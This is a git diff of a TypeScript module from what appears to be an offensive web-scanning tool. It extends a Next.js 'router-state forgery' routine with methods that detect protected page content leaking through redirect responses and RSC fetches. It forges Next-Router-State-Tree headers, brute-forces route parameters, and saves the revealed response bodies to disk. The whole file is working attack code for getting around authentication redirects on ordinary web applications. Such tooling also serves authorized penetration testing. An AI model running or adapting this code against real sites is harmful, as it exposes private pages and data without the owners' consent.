@@ -1,3 +1,5 @@
+import fs from "node:fs";
+import path from "node:path";
 import rawRequest from "../../../exploit/utility/rawRequest.js";
 import { runWithConcurrency } from "../../../utility/concurrency.js";
 import { printMsg, MSG } from "../../../utility/printMsg.js";
@@ -5,12 +7,16 @@ import {
     type AncestorSegment,
     type LeafMode,
     REQUEST_TIMEOUT_MS,
+    RSF_LEAKS_DIR,
+    type RsfLeak,
     ancestorsToPath,
     attemptForgeWithSchemaFallback,
     extractChunkPathsFromFlightBody,
     hasDynamicSegment,
     resolveChunkUrl,
+    saveRsfLeak,
 } from "./rsfShared.js";
+import { fetchRscHeaderLeak, isRedirectBodyLeak } from "./next_rsfRedirectLeak.js";
 import { buildStaticAncestorAttempts } from "./next_rsfAncestorClaim.js";
 import {
     COMMON_DYNAMIC_PARAM_NAMES,
@@ -45,13 +51,21 @@ export interface RouterStateForgeResult {
     revealed: Record<string, string[]>;
     /** New downloadable JS chunk URLs recovered from any revealed Flight payload. */
     newJsUrls: string[];
+    /** Saved response bodies, one per hit (empty when no `hostDir` was given). */
+    leaks: RsfLeak[];
 }
 
 const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
 
 /**
- * Runs every router-state-forgery lazyload method (`next_rsfAncestorClaim`,
- * `next_rsfParamBruteforce`, `next_interceptRouteNextUrl`), each gated by `shouldRun`.
+ * Runs every router-state-forgery lazyload method (`next_rsfRedirectBodyLeak`,
+ * `next_rsfRscHeaderLeak`, `next_rsfAncestorClaim`, `next_rsfParamBruteforce`,
+ * `next_interceptRouteNextUrl`), each gated by `shouldRun`.
+ *
+ * For each candidate page URL that redirects an unauthenticated request, the redirect itself is
+ * checked first: a layout's `redirect()` doesn't stop the page under it from rendering, so its
+ * output may ship in the 3xx HTML (`next_rsfRedirectBodyLeak`) or the RSC response
+ * (`next_rsfRscHeaderLeak`) — see `next_rsfRedirectLeak.ts`.
  *
  * For each candidate page URL that redirects an unauthenticated request, retries as an RSC
  * fetch with a forged `Next-Router-State-Tree` claiming ancestor segments are already mounted.
@@ -72,15 +86,41 @@ const next_rsf = async (
     threads: number,
     rscParamBruteforceLimit: number = DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT,
     shouldRun: (method: string) => boolean = () => true,
-    timeout: number = REQUEST_TIMEOUT_MS
+    timeout: number = REQUEST_TIMEOUT_MS,
+    hostDir?: string
 ): Promise<RouterStateForgeResult> => {
     const runClaim = shouldRun("next_rsfAncestorClaim");
     const runBruteforce = shouldRun("next_rsfParamBruteforce");
+    const runBodyLeak = shouldRun("next_rsfRedirectBodyLeak");
+    const runRscLeak = shouldRun("next_rsfRscHeaderLeak");
     const revealed: Record<string, string[]> = {};
     const record = (key: string, url: string) => (revealed[key] ??= []).push(url);
     const newJsUrls: string[] = [];
+    const leaks: RsfLeak[] = [];
 
-    if (runClaim || runBruteforce) {
+    /** Collects a hit's chunk URLs (`knownChunks`, else every chunk in `body`) and, with a `hostDir`, saves its body. */
+    const keep = (
+        method: string,
+        url: string,
+        body: string,
+        ext: "html" | "rsc",
+        requestHeaders?: Record<string, string>,
+        knownChunks?: string[]
+    ): string[] => {
+        const origin = new URL(url).origin;
+        const chunks = knownChunks ?? extractChunkPathsFromFlightBody(body).map((c) => resolveChunkUrl(c, origin));
+        newJsUrls.push(...chunks);
+        if (hostDir) {
+            try {
+                leaks.push(saveRsfLeak(hostDir, { method, url, body, ext, requestHeaders }, chunks));
+            } catch (err) {
+                printMsg(MSG.Warn, `[!] Could not save the response for ${url}: ${(err as Error).message}`);
+            }
+        }
+        return chunks;
+    };
+
+    if (runClaim || runBruteforce || runBodyLeak || runRscLeak) {
         await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
             let parsed: URL;
             try {
@@ -89,17 +129,30 @@ const next_rsf = async (
                 return;
             }
             const segments = parsed.pathname.split("/").filter(Boolean);
-            if (segments.length === 0) return;
+            const ancestorAttempts =
+                segments.length === 0
+                    ? []
+                    : buildAncestorAttempts(segments, undefined, { dynamic: runBruteforce, static: runClaim });
+            if (ancestorAttempts.length === 0 && !runBodyLeak && !runRscLeak) return;
 
-            const ancestorAttempts = buildAncestorAttempts(segments, undefined, {
-                dynamic: runBruteforce,
-                static: runClaim,
-            });
-            if (ancestorAttempts.length === 0) return;
-
-            // Only worth forging against routes that actually redirect an unauthenticated request.
+            // Every method here only applies to routes that redirect an unauthenticated request.
             const baseline = await rawRequest(candidateUrl, { timeout });
             if (!baseline || baseline.status < 300 || baseline.status >= 400) return;
+
+            if (runBodyLeak && isRedirectBodyLeak(baseline)) {
+                printMsg(MSG.Finding, `[✓] Redirect response (HTML) revealed page content: ${candidateUrl}`);
+                record("next_rsfRedirectBodyLeak", candidateUrl);
+                keep("next_rsfRedirectBodyLeak", candidateUrl, baseline.body, "html");
+            }
+            if (runRscLeak) {
+                const rsc = await fetchRscHeaderLeak(candidateUrl, timeout);
+                if (rsc) {
+                    printMsg(MSG.Finding, `[✓] Redirect response (RSC) revealed page content: ${rsc.url}`);
+                    record("next_rsfRscHeaderLeak", candidateUrl);
+                    keep("next_rsfRscHeaderLeak", rsc.url, rsc.body, "rsc", { RSC: "1" });
+                }
+            }
+            if (ancestorAttempts.length === 0) return;
 
             // Anchor for RSC-body harvesting; undefined when there's no dynamic-guess slot.
             const harvestAnchor = runBruteforce ? lastAncestorValue(segments) : undefined;
@@ -127,15 +180,19 @@ const next_rsf = async (
                                 ? "Router-state request (content)"
                                 : "Router-state request (metadata-only)";
                         printMsg(
-                            MSG.Run,
+                            MSG.Finding,
                             `[✓] ${prefix} ${verb}: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
                         );
                         const method = matchedDynamic ? "next_rsfParamBruteforce" : "next_rsfAncestorClaim";
                         record(leafMode === "page" ? method : `${method}_metadataOnly`, candidateUrl);
                         if (result.keyMode === "legacy") record("next_rsf_legacyKeyAccepted", candidateUrl);
-                        for (const chunkPath of extractChunkPathsFromFlightBody(result.body)) {
-                            newJsUrls.push(resolveChunkUrl(chunkPath, parsed.origin));
-                        }
+                        keep(
+                            leafMode === "page" ? method : `${method}_metadataOnly`,
+                            result.requestUrl ?? candidateUrl,
+                            result.body,
+                            "rsc",
+                            result.requestHeaders
+                        );
                         return { success: true, matchedDynamic };
                     }
                 }
@@ -171,10 +228,18 @@ const next_rsf = async (
         const intercept = await next_interceptRouteNextUrl(origin, discoveredUrls, candidateUrls, threads);
         revealed["next_interceptRouteNextUrl"] = intercept.revealedUrls;
         newJsUrls.push(...intercept.newJsUrls);
+        for (const hit of intercept.hits) {
+            keep("next_interceptRouteNextUrl", hit.url, hit.body, "html", { "Next-Url": hit.nextUrl }, hit.chunks);
+        }
+    }
+
+    if (hostDir && leaks.length > 0) {
+        fs.writeFileSync(path.join(hostDir, RSF_LEAKS_DIR, "index.json"), JSON.stringify(leaks, null, 4));
+        printMsg(MSG.Finding, `[+] Saved ${leaks.length} revealed response(s) to ${path.join(hostDir, RSF_LEAKS_DIR)}`);
     }
 
     for (const key of Object.keys(revealed)) revealed[key] = [...new Set(revealed[key])];
-    return { revealed, newJsUrls: [...new Set(newJsUrls)] };
+    return { revealed, newJsUrls: [...new Set(newJsUrls)], leaks };
 };
 
 export default next_rsf;
